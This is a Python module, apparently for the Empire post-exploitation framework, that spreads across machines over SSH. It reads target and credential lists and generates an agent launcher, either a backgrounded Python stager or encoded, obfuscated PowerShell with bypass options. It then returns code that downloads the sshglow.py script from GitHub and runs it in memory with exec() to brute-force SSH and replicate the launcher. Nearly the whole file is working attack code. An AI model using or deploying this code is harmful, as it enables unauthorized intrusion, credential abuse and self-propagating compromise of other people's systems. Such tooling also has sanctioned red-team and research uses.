from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict
from os.path import isfile

from empire.server.common.module_models import PydanticModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        targets = params['Targets']
        creds = params['Creds']
        delay = params['Delay']
        noReplicate = 'True' if params['noReplicate'].lower() == 'true' else 'False'
        command = params['Command']
        language = params['Language']
        listenerName = params['Listener']
        userAgent = params['UserAgent']
        safeChecks = params['SafeChecks']
        obfuscate = params['Obfuscate'].lower() == 'true'
        obfuscate_command = params['ObfuscateCommand']

        # if targets in file

        if isfile(targets):
            # convert file content to SSHGlow targets format 
            targets = open(targets,'r').read().strip().replace('\n',',')

        # if creds in file

        if isfile(creds):
            # convert file content to SSHGlow creds format like (user1:pass1,user2:pass2)
            creds = open(creds,'r').read().strip().replace('\n',',')

        if command != '':
            cmd = command

        elif listenerName != '':
            # Check if the listener is valid or not
            if not main_menu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listenerName)

            # Generate the launcher code
            if language.lower() == 'python':
                cmd = 'nohup ' + main_menu.stagers.generate_launcher(listenerName, 
                            language='python', userAgent=userAgent, safeChecks=safeChecks)
                
                cmd = cmd.replace("'", "\\'")
                cmd = cmd.replace('"', '\\"')
                cmd += ' </dev/null >/dev/null 2>&1 & '

            elif language.lower() == 'powershell':
                # Generate the PowerShell one-liner with all of the proper options set
                cmd = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=userAgent, proxy=params['Proxy'], proxyCreds=params['ProxyCreds'],
                                                               bypasses=params['Bypasses'])

                
            if cmd == "":
                return handle_error_message("[!] Error in launcher command generation.")

        else:
            return handle_error_message("[!] Please Use Command Or Listener.")


        # Code will load SSHGlow tool in memory and call run function
        # We Must use globals in exec function because empire agent will put our code in function and call it with reflection
        

        return f"""
            import urllib
            from urllib.request import urlopen
            try:
                exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"),globals())
                run("{targets}","{creds}",delay={delay},no_replicate={noReplicate},cmd="{cmd}")
            except urllib.error.URLError:
                print("\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow")
            except Exception as e:
                print("\033[0;31m[!]\033[0;37m Error occured -> ",e)
        """.replace('            ','')
